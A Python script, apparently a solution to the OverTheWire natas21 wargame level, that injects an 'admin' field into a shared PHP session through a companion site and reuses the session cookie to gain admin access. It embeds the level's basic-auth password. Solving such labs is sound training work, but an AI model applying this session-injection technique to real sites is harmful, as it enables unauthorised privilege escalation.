import requests

url="http://natas21-experimenter.natas.labs.overthewire.org/"
url2="http://natas21.natas.labs.overthewire.org"
auth=("natas21","BPhv63cKE1lkQl04cE5CuFTzXe15NfiH")
data={
    "align":"center",
    "fontsize":"100%",
    "bgcolor":"blue",
    "submit":"Update",
    "admin":1
}
params={
    "debug":"1"
}
cookies={
    "PHPSESSID":"n59g8tbn2k0pkmks6m7v5l87p8"
}


response=requests.post(
    url,
    data=data,
    auth=auth,
    params=params,
    cookies=cookies
)


print(response.text)

print("\n\n\n\n\n\n\n\n\n\n")

r2=requests.post(
    url2,
    data=data,
    auth=auth,
    params=params,
    cookies=cookies
)

print(r2.text)